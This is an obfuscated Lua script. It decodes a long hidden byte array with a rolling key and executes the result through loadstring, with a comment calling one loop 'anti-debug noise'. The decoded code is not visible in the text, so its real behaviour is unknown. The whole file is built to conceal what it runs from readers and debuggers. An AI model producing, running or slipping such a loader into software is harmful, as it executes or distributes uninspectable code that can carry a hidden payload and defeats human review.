([[thisobfuscatemadebyflexaa]]):gsub('.+',function(a) DfckPSRfidoK=a end); return (function(...)
  local ivkizJnSOg=32; local ICQrwXRVAjN=9; local oGYutYTIK=19;
  local KkZSJrDo={
    64,92,120,148,252,27,43,69,108,60,136,192,209,5,13,54,83,28,85,84,183,205,245,9,250,35,93,136,131,177,218,250,9,31,61,28,50,124,180,197,249,1,42,71,18,53,50,176,207,223,249,32,240,56,119,135,161,200,200,0,17,69,77,118,
    64,121,120,196,252,13,65,73,114,143,102,160,223,239,9,48,48,104,121,173,181,222,146,174,44,75,91,117,156,108,206,249,14,31,76,93,127,154,104,199,246,239,251,42,86,130,80,109,106,156,184,212,240,96,105,151,171,138,239,245,25,64,16,54,
    78,113,129,126,176,204,232,4,108,139,155,181,220,172,10,37,67,103,136,149,179,215,168,225,224,40,103,119,145,184,184,240,1,53,61,102,74,131,169,205,244,226,39,70,51,116,145,176,196,164,186,246,49,79,115,148,161,191,227,182,220,236,32,45,
    42,92,120,148,176,21,46,4,110,139,172,116,210,237,11,47,80,93,123,159,112,224,240,9,46,252,106,121,164,193,218,242,192,33,70,88,26,54,104,132,160,188,36,67,83,109,148,100,205,156,213,212,50,77,107,143,176,189,219,255,234,18,81,114,
    132,130,193,230,3,32,11,76,105,136,156,124,146,224,23,51,76,73,121,162,177,211,245,9,46,80,26,61,58,108,136,164,192,37,62,20,126,155,188,132,237,188,44,60,85,122,72,182,197,240,13,38,62,12,109,146,164,102,130,180,208,236,8,112,
    143,159,185,224,176,25,55,72,32,89,88,193,170,210,17,50,68,66,129,166,195,224,203,12,41,72,92,60,82,148,209,248,2,43,80,60,113,154,172,208,229,14,218,253,250,44,72,100,128,229,254,212,61,91,108,68,161,202,220,180,29,59,76,62,
    105,175,153,156,178,249,55,72,117,136,157,167,211,254,17,52,84,30,65,84,196,212,237,18,202,252,24,52,80,108,136,164,192,40,71,87,113,152,104,202,229,10,46,244,45,44,143,169,212,239,253,34,70,20,117,147,164,133,130,180,208,236,8,36,
    64,92,120,218,255,30,232,67,44,60,158,201,222,239,200,45,78,28,136,149,185,222,251,204,39,65,108,123,147,116,220,246,21,33,1,29,48,144,183,110,160,188,216,244,16,44,72,100,128,156,184,212,57,82,40,152,185,204,221,3,22,244,78,121,
    142,159,129,148,205,233,232,6,102,145,166,183,228,245,23,50,2,28,121,162,180,140,246,19,52,252,95,121,164,181,214,234,15,228,62,105,126,143,113,146,238,253,37,57,16,128,144,169,206,134,184,212,240,12,40,68,96,124,152,180,208,236,8,36,
    64,92,193,218,176,19,45,88,102,129,166,202,152,242,29,50,67,37,56,113,141,140,238,9,46,82,24,136,152,177,214,142,192,220,248,20,48,76,104,132,160,188,216,244,16,44,72,100,128,156,184,212,60,91,107,133,172,124,231,255,220,236,75,115,
    142,175,204,231,176,233,232,84,99,125,164,192,152,243,13,56,67,107,134,167,196,205,246,24,51,8,24,122,165,186,203,173,170,220,248,20,48,76,104,132,160,188,216,244,16,44,72,100,128,156,184,212,240,85,110,68,175,199,152,8,24,49,86,14,
    64,92,120,148,176,204,232,4,32,60,88,116,144,172,200,228,0,28,56,84,112,140,168,196,38,75,106,52,153,120,136,250,192,37,70,20,128,141,177,214,243,196,27,67,94,127,156,183,137,156,252,35,218,12,40,68,96,124,152,180,208,236,8,36,
    64,92,120,148,176,204,232,4,32,60,88,116,144,172,200,228,0,101,126,84,198,140,197,225,224,13,38,73,80,192,208,233,14,198,248,20,48,76,104,132,160,188,216,244,16,44,72,100,128,156,184,212,240,12,40,68,96,124,152,180,208,236,8,36,
    64,92,200,215,241,24,52,12,102,145,166,183,228,245,23,50,8,37,34,84,112,140,168,196,224,252,24,52,80,108,136,164,192,220,248,20,48,76,104,132,160,188,216,244,16,44,72,100,128,156,184,212,240,12,40,136,165,190,237,251,222,63,77,120,
    131,171,198,231,4,13,54,88,40,130,173,194,211,184,200,45,12,28,80,100,128,149,146,196,224,252,24,52,80,108,136,164,192,220,248,20,48,76,104,132,160,188,216,244,16,44,72,100,128,156,184,212,240,12,40,137,174,192,161,158,208,236,8,36,
    64,92,120,148,176,204,232,4,32,60,88,116,144,172,200,228,0,28,56,84,112,140,168,196,37,74,92,30,80,108,136,164,192,220,248,20,48,76,104,132,160,188,216,244,16,44,72,100,128,156,184,212,53,90,108,46,96,124,152,180,208,236,8,36,
    64,92,120,148,176,204,232,4,32,60,88,116,213,250,12,206,0,28,56,84,112,140,168,196,224,252,24,52,80,108,136,164,5,42,60,254,48,76,104,132,160,188,216,244,16,44,72,100,197,234,252,190,240,12,40,68,96,124,152,180,21,58,76,14,
    64,92,120,148,245,26,44,238,101,138,156,94,122,239,30,23,35,82,126,170,120,149,146,174,12,75,91,117,156,156,212,229,25,33,74,34,83,148,169,214,225,255,44,57,98,77,140,168,197,224,210,247,63,90,118,137,163,208,160,250,37,58,75,120,
    137,171,198,156,185,182,63,69,105,144,96,134,153,150,200,228,0,28,123,170,163,175,222,10,54,4,33,30,149,186,204,173,170,198,65,90,48,154,183,216,160,5,43,51,99,133,150,165,208,239,253,19,54,97,118,135,180,197,231,2,208,64,80,105,
    142,70,120,148,176,204,46,89,110,127,172,189,223,250,200,45,83,91,139,173,190,205,248,23,37,59,94,137,158,175,220,237,15,42,0,83,57,76,186,201,244,17,42,66,16,114,137,176,211,225,184,25,62,80,18,137,174,192,130,158,28,59,75,101,
    140,92,204,213,2,19,45,88,115,60,117,116,235,150,200,228,0,28,115,86,179,226,219,231,22,66,110,54,141,108,165,164,20,46,77,89,60,54,104,132,160,188,19,246,90,112,158,183,191,224,14,23,52,80,126,70,157,124,181,180,36,62,93,105,
    42,185,98,126,246,27,58,4,95,72,88,186,229,250,11,228,73,106,56,162,181,228,252,208,224,67,93,136,151,175,144,248,18,49,61,29,48,144,183,110,160,188,216,244,89,114,72,184,217,236,253,35,54,20,110,153,174,191,161,180,237,9,8,38,
    134,177,198,215,4,21,55,82,34,60,153,194,212,172,22,51,84,28,129,167,175,223,1,18,33,76,107,121,143,178,221,242,3,48,65,99,126,84,174,217,238,255,225,244,100,116,141,178,106,156,184,212,240,12,40,68,96,200,231,247,17,56,8,109,
    142,162,199,148,205,204,44,73,98,145,159,130,215,241,28,45,78,98,135,92,182,225,246,7,233,230,24,52,80,108,136,164,192,220,65,90,48,149,182,202,239,188,25,66,84,44,156,165,210,227,253,40,67,71,113,146,166,203,166,2,17,57,77,97,
    64,176,192,217,254,182,232,4,32,60,88,116,144,172,200,228,0,28,128,163,191,215,238,25,46,63,108,125,159,186,144,234,21,42,59,32,48,146,189,210,227,16,33,67,94,52,86,114,142,165,184,38,53,96,125,150,174,124,230,253,28,236,77,114,
    132,101,98,148,176,204,232,4,32,60,88,185,222,240,178,228,0,28,56,153,190,208,146,9,46,64,2,30,156,187,203,229,12,220,75,89,130,162,177,199,229,15,216,17,16,135,50,100,128,156,184,27,49,89,109,94,135,193,236,231,21,62,94,109,
    131,161,128,150,230,27,49,71,101,95,160,181,228,223,13,54,86,101,123,153,114,149,180,174,224,252,24,52,151,173,213,233,218,3,61,104,99,145,186,218,233,255,29,252,18,78,154,179,215,239,253,38,35,81,122,154,169,191,221,182,217,248,242,36,
    64,92,120,219,241,25,45,30,71,129,172,167,213,254,30,45,67,97,64,86,145,223,251,9,52,47,93,134,166,181,203,233,194,229,226,113,26,54,174,211,242,188,23,0,16,127,141,182,214,229,251,25,240,85,118,68,169,204,217,253,34,63,16,119,
    133,174,206,221,243,17,59,13,32,128,167,94,144,172,200,228,70,107,138,84,175,152,168,19,34,70,24,125,158,108,209,244,1,37,74,103,56,159,173,214,246,5,27,57,42,83,141,184,164,225,11,23,53,90,108,133,174,208,235,188,217,245,8,104,
    143,70,120,148,176,204,232,4,32,60,161,186,144,251,10,46,26,69,139,117,120,142,219,7,50,69,104,136,82,117,136,229,14,32,248,99,114,150,118,178,225,9,29,14,93,109,156,167,200,164,186,15,46,17,127,131,157,126,161,180,17,58,76,36,
    143,158,194,174,217,31,12,73,115,127,157,194,212,237,22,56,47,98,64,155,177,217,237,205,224,80,96,121,158,86,136,164,192,220,248,20,48,76,104,132,160,188,40,55,81,120,148,108,198,241,6,23,68,85,119,146,104,133,130,180,208,236,8,36,
    64,92,120,148,176,204,232,4,32,60,88,195,210,246,226,8,69,111,140,166,191,229,176,205,202,252,24,52,80,108,136,164,192,220,248,20,48,145,182,200,169,166,216,244,16,44,72,100,128,156,253,34,52,246,40,68,96,124,221,2,20,214,77,114,
    132,70,98,224,255,15,41,80,32,130,173,194,211,0,17,51,78,28,139,153,194,226,241,7,37,36,89,135,125,187,204,249,12,33,43,87,130,149,184,216,168,15,29,70,102,117,139,169,137,134,184,212,240,12,110,147,178,124,215,192,208,47,80,109,
    140,160,120,221,254,204,49,84,97,133,170,199,152,255,13,54,86,101,123,153,138,179,237,24,3,68,97,128,148,190,205,242,200,229,1,20,116,155,82,132,160,188,216,244,16,44,72,173,198,156,251,28,57,88,108,94,137,207,185,188,210,25,87,104,
    149,168,189,199,243,30,49,84,116,62,97,116,228,244,13,50,234,28,56,84,112,140,168,196,224,252,24,52,80,190,205,248,21,46,70,20,132,158,189,201,138,188,216,244,16,44,72,100,128,225,6,24,218,12,40,68,96,193,230,248,186,236,8,36,
    64,174,189,232,5,30,54,4,102,125,164,199,213,150,13,50,68,6,34,160,191,207,233,16,224,80,89,134,151,177,220,215,5,46,78,93,115,145,104,161,160,10,33,64,250,22,142,179,210,156,247,224,240,95,109,150,182,197,219,249,208,53,86,36,
    137,172,185,221,2,31,240,87,101,142,174,189,211,241,27,237,0,96,135,62,112,140,168,196,41,66,24,130,159,192,136,247,5,46,78,93,115,145,144,197,243,233,39,56,101,120,141,151,195,238,1,36,68,20,123,137,178,210,225,247,21,245,8,120,
    136,161,198,126,176,204,232,4,32,60,88,116,228,237,26,43,69,112,107,153,194,226,241,7,37,252,53,52,163,177,218,250,9,31,61,254,48,76,104,132,160,188,216,244,82,126,141,165,203,134,184,212,240,12,109,146,164,102,221,2,20,214,242,109,
    134,92,204,213,2,19,45,88,83,129,170,202,217,239,13,228,84,100,125,162,90,140,168,196,224,66,103,134,80,171,148,164,15,30,66,20,121,154,104,212,225,5,42,71,24,115,141,184,206,229,4,29,62,95,124,133,174,191,221,7,216,245,17,36,
    132,171,98,148,176,204,232,4,32,60,88,189,214,172,28,61,80,97,135,154,120,219,234,14,233,252,53,81,80,110,177,242,19,48,57,98,115,145,106,132,225,10,28,244,95,110,146,114,163,232,249,39,67,58,105,145,165,124,181,209,208,238,53,115,
    132,177,196,217,227,15,58,77,112,144,90,116,228,244,13,50,234,28,56,84,112,140,168,196,224,252,24,52,80,188,203,229,12,40,0,90,133,154,171,216,233,11,38,252,25,22,72,100,128,156,184,212,240,12,40,68,96,124,152,180,208,236,87,102,
    138,106,168,213,2,17,54,88,32,89,88,200,209,254,15,41,84,79,125,166,198,213,235,9,202,252,24,52,80,108,136,164,192,220,248,20,48,145,182,200,169,166,216,244,16,44,72,100,128,156,253,34,52,246,40,68,96,124,221,2,20,214,77,114,
    132,70,98,224,255,15,41,80,32,129,174,185,222,0,27,10,79,104,124,153,194,140,197,196,39,61,101,121,106,147,205,248,243,33,74,106,121,143,173,140,162,238,29,68,92,117,139,165,212,225,252,7,68,91,122,133,167,193,154,189,234,35,73,109,
    148,130,199,230,211,20,49,80,100,68,90,153,230,241,22,56,83,30,65,62,188,219,235,5,44,252,108,117,162,179,205,248,242,33,69,99,132,145,82,110,230,11,42,244,79,56,72,179,194,230,184,29,62,12,113,148,161,197,234,7,216,49,94,105,
    142,176,203,186,255,24,44,73,114,86,127,185,228,207,16,45,76,96,138,153,190,148,177,205,224,64,103,30,80,108,136,164,9,34,248,99,114,150,130,173,243,221,224,246,66,113,149,179,212,225,221,42,53,90,124,70,105,124,217,2,20,236,87,102,
    138,106,166,213,253,17,2,81,97,144,155,188,152,174,3,34,5,115,119,145,114,149,168,24,40,65,102,30,80,108,136,164,192,220,248,20,132,141,186,203,229,16,10,57,93,123,156,169,128,185,184,35,50,86,18,68,96,124,152,180,208,236,8,102,
    146,161,185,223,154,204,232,4,32,129,166,184,122,241,22,40,234,6,132,163,179,205,244,196,37,74,91,131,148,177,181,243,4,49,68,89,26,146,183,214,160,251,228,244,99,113,154,186,201,223,253,212,57,90,40,141,176,189,225,6,35,244,91,105,
    146,178,193,215,245,31,241,4,100,139,66,116,144,172,200,42,79,110,56,147,124,140,247,6,42,252,97,130,80,181,216,229,9,46,75,28,131,145,186,218,233,255,29,14,55,113,156,136,197,239,251,25,62,80,105,146,180,207,160,189,217,236,76,115,
    42,92,120,148,176,204,232,4,32,133,158,116,223,238,18,254,41,111,89,92,114,185,247,8,53,72,93,103,147,190,209,244,20,222,1,20,113,154,172,132,239,254,34,2,62,109,149,169,154,233,249,40,51,84,48,70,155,186,157,11,15,41,10,45,
    64,176,192,217,254,182,232,4,32,60,88,116,144,172,200,228,0,28,135,150,186,154,214,5,45,65,24,81,80,110,173,242,3,43,60,89,93,155,172,217,236,1,218,222,16,44,72,100,128,156,184,212,240,12,40,68,165,202,219,3,20,49,53,115,
    132,177,196,217,176,233,232,83,98,134,66,116,144,172,200,228,0,28,56,84,112,140,168,6,50,65,89,127,58,108,136,164,192,220,248,20,48,145,182,200,138,188,216,244,16,113,150,168,106,156,184,212,240,85,110,68,165,202,219,3,20,49,53,115,
    132,177,196,217,176,32,48,73,110,60,154,198,213,237,19,228,69,106,124,62,181,218,236,174,202,72,103,119,145,184,136,214,21,42,43,89,130,162,177,199,229,188,245,244,87,109,149,169,154,195,253,40,35,81,122,154,169,191,221,188,210,30,93,114,
    115,161,202,234,249,15,45,6,41,38,66,189,214,172,13,50,67,107,124,153,157,219,236,25,44,65,24,117,158,176,136,248,1,46,63,89,132,126,173,209,239,16,29,244,100,116,141,178,106,156,184,212,240,88,119,135,161,200,152,217,30,47,87,104,
    133,92,149,148,2,17,57,89,105,142,157,124,213,250,11,51,68,97,101,163,180,225,244,9,233,230,2,52,80,108,136,240,15,31,57,96,48,146,189,210,227,16,33,67,94,44,141,177,213,232,249,40,53,52,105,146,164,207,224,245,27,49,16,45,
    42,92,120,148,176,204,232,4,32,136,167,183,209,248,200,55,69,110,142,153,194,192,241,17,37,252,53,52,167,187,218,239,19,44,57,87,117,102,143,201,244,239,29,70,102,113,154,152,201,233,253,2,63,99,48,77,74,124,152,180,208,236,8,36,
    64,168,199,215,241,24,232,84,97,142,172,133,144,201,200,9,78,95,135,152,181,154,237,18,35,75,92,121,88,110,211,247,19,47,75,103,61,78,104,146,174,188,44,67,99,128,154,173,206,227,192,33,49,96,112,82,179,197,230,188,35,49,90,122,
    133,174,172,221,253,17,241,4,42,60,110,141,144,187,200,246,14,52,74,103,130,149,177,174,224,252,24,52,80,108,136,164,12,43,59,85,124,76,184,197,242,16,234,244,45,44,109,178,195,235,252,25,254,81,118,135,175,192,221,188,36,59,91,120,
    146,165,198,219,184,25,41,88,104,74,171,189,222,180,27,41,82,114,125,166,164,213,245,9,233,252,39,52,100,127,158,187,211,236,10,39,57,85,82,132,160,188,216,244,16,44,72,184,193,238,255,25,68,62,109,145,175,208,221,206,246,53,90,105,
    115,161,202,234,245,30,240,84,97,142,172,133,156,172,24,37,82,112,74,93,90,140,168,196,224,65,102,120,58,86,136,164,192,220,68,99,115,141,180,132,229,8,25,68,99,113,140,100,157,156,200,190,240,12,40,68,146,209,230,231,21,62,94,109,
    131,161,134,188,245,13,58,88,98,129,153,200,170,207,23,50,78,97,123,168,120,210,253,18,35,80,97,131,158,116,204,248,201,198,248,20,48,76,104,132,160,188,29,64,81,124,155,169,196,156,195,241,240,80,124,46,96,124,152,180,208,236,8,36,
    137,162,120,217,252,13,56,87,101,128,88,146,173,172,217,244,0,112,128,153,190,118,168,196,224,252,24,52,80,108,136,164,192,220,61,96,113,156,187,201,228,188,245,244,32,22,72,100,128,156,184,212,240,12,40,68,96,124,221,1,37,56,73,120,
    133,132,185,226,244,31,48,69,107,129,96,125,122,172,200,228,0,28,56,84,112,209,246,8,202,252,24,52,80,177,214,232,201,198,61,96,131,145,82,132,160,188,216,75,81,126,150,108,130,193,6,23,63,80,109,113,175,192,237,0,21,236,94,105,
    153,157,120,220,245,16,45,74,32,110,157,193,223,0,13,9,86,97,134,168,112,206,253,16,53,74,89,129,145,176,153,178,194,229,226,89,126,144,82,110,240,14,33,66,100,52,74,168,207,234,253,212,61,77,115,141,174,195,152,8,24,49,8,101,
    142,176,193,148,243,20,45,69,116,60,168,198,213,243,22,37,78,112,58,93
  };
  local _t={}; local _s={};
  -- lightweight anti-debug noise
  for _i=1,3 do _t[_i]=(_i*ivkizJnSOg)%(ivkizJnSOg+ICQrwXRVAjN+oGYutYTIK) end
  for i=1,#KkZSJrDo do
    local n=(KkZSJrDo[i] - (ivkizJnSOg + (i-1)*ICQrwXRVAjN)) % 256
    _s[i]=string.char(n)
    ivkizJnSOg = (ivkizJnSOg + oGYutYTIK) % 256
  end
  local irskdviWAl=table.concat(_s)
  local rQMrTBUakZyU=(loadstring or load)
  local _f=rQMrTBUakZyU(irskdviWAl)
  if _f then return _f(...) end
end)(...)

